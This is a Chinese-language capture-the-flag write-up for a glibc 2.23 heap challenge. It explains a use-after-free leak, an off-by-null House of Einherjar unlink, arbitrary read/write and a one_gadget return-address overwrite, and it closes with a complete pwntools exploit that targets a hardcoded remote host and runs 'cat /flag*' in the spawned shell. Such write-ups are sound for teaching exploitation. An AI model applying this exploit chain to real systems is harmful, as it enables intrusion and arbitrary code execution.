
### 1. 漏洞与环境分析

从 EXP 中可以看出程序的几个关键特性和漏洞：
- **环境**：使用的是 `libc-2.23.so`，没有 `tcache` 机制，堆块释放后会进入 `fastbin` 或 `unsorted bin`。
- **UAF (Use-After-Free) 读**：释放堆块后，仍然可以通过 `read_back` 读取堆块内容，用于信息泄露。
- **Off-By-Null / 单字节溢出**：在编辑堆块（`modify_entry`）时，大概率由于 `strcpy` 或末尾自动补 `\x00` 的机制，存在单字节溢出，可以覆盖相邻下一个堆块的 `prev_size` 并清空 `PREV_INUSE` 标志位。
- **全局缓冲区机制**：在修改或添加内容时，程序会先将输入暂存到 `tinypad` 的全局结构体变量 (`TINYPAD_GLOBAL`) 中。这一特性被用来在已知地址伪造 Chunk。

---

### 2. 利用过程分步解析

#### 第一阶段：信息泄露 (Phase 1: Heap & Libc Leak)
由于存在 UAF 漏洞，EXP 利用 `unsorted bin` 的双向链表特性来泄露堆地址和 libc 基址。
1. 申请 4 个 `0x80` 大小的 Chunk（在 libc-2.23 中，大于 fastbin 阈值的块释放后会直接进入 `unsorted bin`）。
2. 依次释放 Chunk 3 和 Chunk 1。由于它们之间有 Chunk 2 隔开，不会发生合并。
3. 释放后，`unsorted bin` 链表结构为：`main_arena` <-> `Chunk 1` <-> `Chunk 3` <-> `main_arena`。
   - 读取 Chunk 1 的 `fd` 指针，它指向 Chunk 3，从而**泄露堆基址 (Heap Base)**。
   - 读取 Chunk 3 的 `fd` 指针，它指向 `main_arena`，从而**泄露 Libc 基址**。

#### 第二阶段：House of Einherjar 向后合并 (Phase 2: Unsafe Unlink)
目标：通过 Off-By-Null 漏洞触发向后合并，将一个伪造的 Chunk 放入 `unsorted bin`，该伪造块的地址位于全局变量 `TINYPAD_GLOBAL + 0x20`。

1. **布置堆与伪造 Chunk**：
   - 分配 Chunk 1 (0x18)、Chunk 2 (0x100) 等堆块。
   - 利用 `modify_entry` 向 Chunk 3 写入内容：`b"W" * 0x20 + pack_words(0, 0x101, victim, victim)`。
   - **关键点**：`modify_entry` 会先将输入保存在全局缓冲区 `TINYPAD_GLOBAL` 中。因此这会在 `TINYPAD_GLOBAL + 0x20` (即 `victim`) 处刚好伪造出一个 `size=0x101, fd=victim, bk=victim` 的 Fake Chunk。
   - 因为 `victim` 就是自己，所以 `victim->fd->bk == victim`，完美绕过 `unlink` 的安全检查。

2. **渐进式 Off-By-Null 写入 (极为巧妙)**：
   EXP 需要将 Chunk 2 的 `prev_size` 修改为它与 `victim` 的距离 (`delta`)，并覆盖 Chunk 2 `size` 的最低位为 `\x00`（清除 `PREV_INUSE`）。但因为 `strcpy` 遇 `\x00` 截断，无法一次性写入带有中间零字节的 `delta`。
   EXP 使用了一个绝妙的循环：
   ```python
   for cut in range(nulls_needed + 1):
       modify_entry(p, 1, b"A" * 0x10 + delta.rjust(8 - cut, b"F"))
   ```
   *原理*：每次写入长度递减的字符串，字符串末尾自动追加的 `\x00` 会逐个从高地址向低地址填充。后一次较短的写入不会覆盖前一次在更高地址留下的 `\x00`。最终成功在内存中构造出完整的 8 字节 `prev_size` 并清除了 `PREV_INUSE` 标志。

3. **触发合并**：
   - 释放 Chunk 2。`free` 函数检查发现前一个块是空闲的，读取 `prev_size` 进行向后合并。
   - 堆管理器将指针向后跨越到了 `TINYPAD_GLOBAL + 0x20` 并执行 `unlink`。
   - 合并后，包含 `TINYPAD_GLOBAL + 0x20` 在内的一个巨大 Chunk 被放入了 `unsorted bin` 中。

#### 第三阶段：堆元数据劫持与任意读写 (Phase 3: Stack Overwrite & Arbitrary R/W)
此时 `unsorted bin` 的头部已经位于 `TINYPAD_GLOBAL + 0x20`（全局 bss 段）。
1. 修复由于释放产生的 `fd/bk` 破坏，再次向 `modify_entry(4)` 发送载荷重建 `main_arena` 指针。
2. 申请一个大小为 `0xF0` 的 Chunk。堆管理器会从位于全局缓冲区的 `unsorted bin` 切割并返回 `TINYPAD_GLOBAL + 0x30`。
3. 写入 `0xD0` 字节的 Padding 后，恰好触及 `TINYPAD_GLOBAL + 0x100` —— **这里是程序存放所有 Chunk 元数据（如指针、大小、使用标志）的数组！**
4. 伪造元数据结构：
   - 将 Chunk 1 的内容指针覆写为 `libc.sym["__environ"]`。
   - 将 Chunk 2 的内容指针覆写为 Chunk 1 的元数据指针地址 `SLOT1_CONTENT_PTR`。
5. **达成任意读写**：
   - 现在，编辑 Chunk 2 可以修改 Chunk 1 的目标指针。
   - 读取 / 编辑 Chunk 1 即完成了对目标指针地址的任意读 / 写（`arb_write`）。

#### 第四阶段：劫持控制流与获取 Flag (Phase 4: Execute One Gadget)
1. **泄露栈地址**：
   直接读取被劫持的 Chunk 1，得到 `__environ` 的值，从而算出程序在栈上的真实地址，并计算出 `main` 函数的返回地址 (`main_ret_addr`)。
2. **植入 One Gadget**：
   使用封装好的 `arb_write` 任意写原语：
   - 将 `main` 的返回地址覆写为 Libc 中的 `one_gadget`。
   - 将 `one_gadget` 需要依赖的栈约束条件（如 `[rsp+0x78] == NULL`）所对应的栈地址覆写为空（通过发送 `\n` 或 `b""` 写零）。
3. **Get Shell**：
   向菜单发送 `Q` (Quit) 指令退出主循环，触发 `main` 函数返回，直接跳入 `one_gadget` 弹回 Shell，最后执行 `cat /flag*` 拿到 Flag。

### 3.EXP
```python
#!/usr/bin/env python3
import re
import sys
from pathlib import Path

from pwn import *

BINARY = "./combination_final"
LIBC = "./libc-2.23.so"
LD = "./ld-2.23.so"

SERVER_IP = "39.96.193.120"
SERVER_PORT = 10003

context.binary = elf = ELF(BINARY, checksec=False)
libc = ELF(LIBC, checksec=False)
context.log_level = "info"

TINYPAD_GLOBAL = elf.sym["tinypad"]
SLOT1_CONTENT_PTR = TINYPAD_GLOBAL + 0x108

MAIN_ARENA_OFFSET = libc.sym["__malloc_hook"] + 0x10
UNSORTED_BIAS = 0x58

OG_CANDIDATE = 0xF1247
RET_OFFSET_FROM_ENVIRON = 0xF0
OG_CONSTRAINT_ARGV = 0x78

def create_connection():
    if args.REMOTE:
        return remote(args.HOST or SERVER_IP, int(args.PORT or SERVER_PORT))
    ld_path = Path(LD)
    if ld_path.exists():
        return process([str(ld_path), "--library-path", ".", BINARY])
    return process(BINARY)

def prompt_for(p: tube, expected: bytes) -> None:
    p.recvuntil(expected)

def send_cmd(p: tube, letter: bytes) -> None:
    prompt_for(p, b"[*] COMMAND >> ")
    p.sendline(letter)

def store_entry(p: tube, sz: int, payload: bytes) -> None:
    send_cmd(p, b"A")
    prompt_for(p, b"[*] MEM_SIZE >> ")
    p.sendline(str(sz).encode())
    p.sendafter(b"[*] MEM_DATA >> ", payload + b"\n")

def remove_entry(p: tube, idx: int) -> None:
    send_cmd(p, b"D")
    prompt_for(p, b"[*] INDEX_ID >> ")
    p.sendline(str(idx).encode())

def modify_entry(p: tube, idx: int, payload: bytes) -> None:
    send_cmd(p, b"E")
    prompt_for(p, b"[*] INDEX_ID >> ")
    p.sendline(str(idx).encode())
    p.sendafter(b"[*] MEM_DATA >> ", payload + b"\n")
    prompt_for(p, b"[?] APPLY_CHANGE? (Y/n) >> ")
    p.sendline(b"Y")

def read_back(p: tube, idx: int) -> bytes:
    p.recvuntil(b" #   INDEX: %d\n # CONTENT: " % idx)
    return p.recvuntil(b"\n+------------------------------------------------------------------------------+", drop=True)

def extract_ptr(raw: bytes) -> int:
    return u64(raw.rstrip(b"\n")[:6].ljust(8, b"\x00"))

def pack_words(*vals: int) -> bytes:
    return b"".join(p64(v) for v in vals)

def phase_heap_leak(p: tube):
    """Alloc 4 chunks, free two to leak heap and libc via unsorted bin."""
    for marker in [b"A", b"B", b"C", b"D"]:
        store_entry(p, 0x80, marker * 8)

    remove_entry(p, 3)
    remove_entry(p, 1)

    heap_raw = extract_ptr(read_back(p, 1))
    heap_base = heap_raw - 0x120

    arena_raw = extract_ptr(read_back(p, 3))
    main_arena_addr = arena_raw - UNSORTED_BIAS
    libc.address = main_arena_addr - MAIN_ARENA_OFFSET

    log.info("heap_base   = %#x", heap_base)
    log.info("main_arena  = %#x", main_arena_addr)
    log.info("libc_base   = %#x", libc.address)

    remove_entry(p, 2)
    remove_entry(p, 4)

    return heap_base, main_arena_addr

def phase_unsafe_unlink(p: tube, heap_base: int, arena_addr: int):
    """Craft fake chunk overlapping tinypad globals, trigger unlink corruption."""
    store_entry(p, 0x18, b"X" * 0x18)
    store_entry(p, 0x100, b"Y" * 0xF8 + p64(0x11))
    store_entry(p, 0x100, b"Z" * 0xF8)
    store_entry(p, 0x100, b"W" * 0xF8)

    victim = TINYPAD_GLOBAL + 0x20

    modify_entry(p, 3, b"W" * 0x20 + pack_words(0, 0x101, victim, victim))

    delta = p64(heap_base + 0x20 - victim).rstrip(b"\x00")
    nulls_needed = 8 - len(delta)
    for cut in range(nulls_needed + 1):
        modify_entry(p, 1, b"A" * 0x10 + delta.rjust(8 - cut, b"F"))

    remove_entry(p, 2)

    modify_entry(p, 4, b"W" * 0x20 + pack_words(0, 0x101, arena_addr + UNSORTED_BIAS, arena_addr + UNSORTED_BIAS))

def phase_stack_overwrite(p: tube):
    """Install R/W primitive via tinypad metadata corruption, leak stack, write one_gadget to main's return addr."""
    store_entry(
        p,
        0xF0,
        b"P" * 0xD0 + pack_words(0x80, libc.sym["__environ"], 0x18, SLOT1_CONTENT_PTR),
    )

    environ_leak = extract_ptr(read_back(p, 1))
    main_ret_addr = environ_leak - RET_OFFSET_FROM_ENVIRON

    log.info("__environ   = %#x", environ_leak)
    log.info("main_ret    = %#x", main_ret_addr)

    return main_ret_addr

def arb_write(p: tube, where: int, what: bytes) -> None:
    modify_entry(p, 2, p64(where)[:6])
    modify_entry(p, 1, what)

def fire_one_gadget(p: tube, ret_addr: int):
    gadget_addr = libc.address + OG_CANDIDATE

    constraint_loc = ret_addr + 8 + OG_CONSTRAINT_ARGV
    arb_write(p, constraint_loc, b"")
    arb_write(p, ret_addr, p64(gadget_addr)[:6])

    log.info("one_gadget  = %#x", gadget_addr)
    send_cmd(p, b"Q")

def pull_flag(io: tube) -> str:
    io.sendline(b"cat /flag* /home/*/flag* 2>/dev/null; exit")
    raw = io.recvrepeat(3).decode("latin-1", "replace")
    m = re.search(r"ISCC\{[^}]+\}", raw)
    if not m:
        raise SystemExit("[-] flag not found in shell output")
    return m.group(0)

def main():
    io = create_connection()

    heap, arena = phase_heap_leak(io)
    phase_unsafe_unlink(io, heap, arena)
    ret = phase_stack_overwrite(io)
    fire_one_gadget(io, ret)

    flag = pull_flag(io)
    print(f"[+] FLAG: {flag}")

if __name__ == "__main__":
    main()

```